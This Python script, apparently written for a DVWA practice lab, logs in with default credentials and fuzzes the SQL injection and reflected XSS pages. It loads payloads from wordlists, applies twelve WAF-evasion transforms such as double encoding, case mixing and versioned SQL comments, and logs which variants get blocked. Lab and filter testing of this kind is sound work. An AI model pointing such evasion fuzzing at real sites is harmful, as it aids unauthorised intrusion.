import re, csv, time, argparse, urllib.parse, requests
from pathlib import Path

BASE = "http://dvwa.local"
LOGIN_URL = f"{BASE}/login.php"
USERNAME = "admin"
PASSWORD = "password"

TARGETS = [
    {"name": "sqli",  "url": f"{BASE}/vulnerabilities/sqli/",  "param": "id",   "submit": "Submit"},
    {"name": "xss_r", "url": f"{BASE}/vulnerabilities/xss_r/", "param": "name", "submit": "Submit"},
]

BROWSER_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/125.0 Safari/537.36"),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
}

def t_plain(s): return s
def t_url(s):   return urllib.parse.quote_plus(s)
def t_durl(s):  return urllib.parse.quote_plus(urllib.parse.quote_plus(s))
def t_mixed(s):
    out, up = [], True
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if up else ch.lower()); up = not up
        else:
            out.append(ch)
    return "".join(out)
def t_cmt(s):   return s.replace(" ", "/**/")
def t_html(s):  return (s.replace("<","&lt;").replace(">","&gt;")
                         .replace("'","&#39;").replace('"',"&quot;"))
def t_tabs(s):  return s.replace(" ", "\t")                 # %09
def t_nl(s):    return s.replace(" ", "\n")                 # %0a
def t_dashplus(s):
    # нормализуем концовку комментария к '--+' (часто WAF ожидает именно '-- ' и его ловит)
    return re.sub(r"--\s*$", "--+", s.strip()) if "--" in s else s
def t_vercomm(s):
    # versioned comments вокруг UNION/SELECT/OR/AND
    s = re.sub(r"\bUNION\b", "/*!50000UNION*/", s, flags=re.I)
    s = re.sub(r"\bSELECT\b", "/*!50000SELECT*/", s, flags=re.I)
    s = re.sub(r"\bOR\b", "/*!50000OR*/", s, flags=re.I)
    s = re.sub(r"\bAND\b", "/*!50000AND*/", s, flags=re.I)
    return s
def t_space_rm(s):
    # убираем пробелы вокруг операторов (оставляя валидный синтаксис за счёт комментариев)
    s = re.sub(r"\s+\bOR\b\s+", "/**/OR/**/", s, flags=re.I)
    s = re.sub(r"\s+\bAND\b\s+", "/**/AND/**/", s, flags=re.I)
    s = s.replace(" UNION ", "/**/UNION/**/").replace(" SELECT ", "/**/SELECT/**/")
    return s
def t_hexquote(s):
    return s.replace("'", "0x27")

TRANSFORMS = [
    ("plain",   t_plain),
    ("url",     t_url),
    ("durl",    t_durl),
    ("MiXeD",   t_mixed),
    ("cmt",     t_cmt),
    ("tabs",    t_tabs),
    ("nl",      t_nl),
    ("dashplus",t_dashplus),
    ("vercomm", t_vercomm),
    ("space_rm",t_space_rm),
    ("html",    t_html),
    ("hexq",    t_hexquote),
]

def extract_token(html:str):
    m = re.search(r'name="user_token"\s+value="([^"]+)"', html, re.I)
    return m.group(1) if m else None

def req_with_retry(call, retries=3, backoff=0.7):
    last = None
    for i in range(retries):
        try:
            return call()
        except (requests.ConnectionError, requests.ReadTimeout) as e:
            last = e
            time.sleep(backoff*(i+1))
    raise last

def login(sess: requests.Session) -> None:
    r = req_with_retry(lambda: sess.get(LOGIN_URL, timeout=20, allow_redirects=False, headers=BROWSER_HEADERS))
    token = extract_token(r.text)
    data = {"username": USERNAME, "password": PASSWORD, "Login": "Login"}
    if token:
        data["user_token"] = token
    req_with_retry(lambda: sess.post(LOGIN_URL, data=data, timeout=20, allow_redirects=False, headers=BROWSER_HEADERS))

    sess.cookies.set("security", "low")

def send(sess: requests.Session, tgt: dict, payload: str, method="GET"):
    p = {tgt["param"]: payload, "Submit": tgt["submit"]}
    hdrs = {**BROWSER_HEADERS, "Referer": tgt["url"]}
    if method == "GET":
        return req_with_retry(lambda: sess.get(tgt["url"], params=p, headers=hdrs, timeout=20, allow_redirects=False))
    else:
        return req_with_retry(lambda: sess.post(tgt["url"], data=p, headers=hdrs, timeout=20, allow_redirects=False))

def run(wordlist_path: Path, kind: str, sess: requests.Session, out_csv: Path) -> None:
    with wordlist_path.open("r", encoding="utf-8") as f, \
         out_csv.open("w", newline="", encoding="utf-8") as out:
        w = csv.writer(out)
        w.writerow(["vuln","base_payload","transform","method","status","blocked?","rtt_ms","where"])

        tgt = next(t for t in TARGETS if kind in t["name"])

        base_value = "1" if kind == "sqli" else "hello"
        for method in ["GET", "POST"]:
            t0 = time.time()
            resp = send(sess, tgt, base_value, method)
            dt = int((time.time() - t0) * 1000)
            w.writerow([
                kind,
                f"BASELINE({tgt['param']}={base_value})",
                "none",
                method,
                resp.status_code,
                resp.status_code != 200,
                dt,
                resp.headers.get("Location", "") or resp.url
            ])

        payloads = [line.rstrip("\n") for line in f if line.strip()]
        for base in payloads:
            for tname, tfun in TRANSFORMS:
                payload = tfun(base)
                for method in ["GET", "POST"]:
                    t0 = time.time()
                    resp = send(sess, tgt, payload, method)
                    dt = int((time.time() - t0) * 1000)
                    w.writerow([
                        tgt["name"],
                        base,
                        tname,
                        method,
                        resp.status_code,
                        resp.status_code != 200,
                        dt,
                        resp.headers.get("Location", "") or resp.url
                    ])

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sqli", default="payloads_sqli.txt")
    ap.add_argument("--xss",  default="payloads_xss.txt")
    ap.add_argument("--out-prefix", default="report")
    args = ap.parse_args()

    s = requests.Session()

    r = req_with_retry(lambda: s.get(BASE + "/", timeout=20, allow_redirects=False, headers=BROWSER_HEADERS))
    loc = r.headers.get("Location","").lower()
    if r.status_code in (301,302,303,307,308) and "login.php" in loc:
        login(s)
    elif r.status_code == 200 and ("login.php" in r.text.lower()):
        login(s)

    run(Path(args.sqli), "sqli", s, Path(f"{args.out_prefix}_sqli.csv"))
    run(Path(args.xss),  "xss",  s, Path(f"{args.out_prefix}_xss.csv"))
    print(f"Готово: {args.out_prefix}_sqli.csv, {args.out_prefix}_xss.csv")

if __name__ == "__main__":
    main()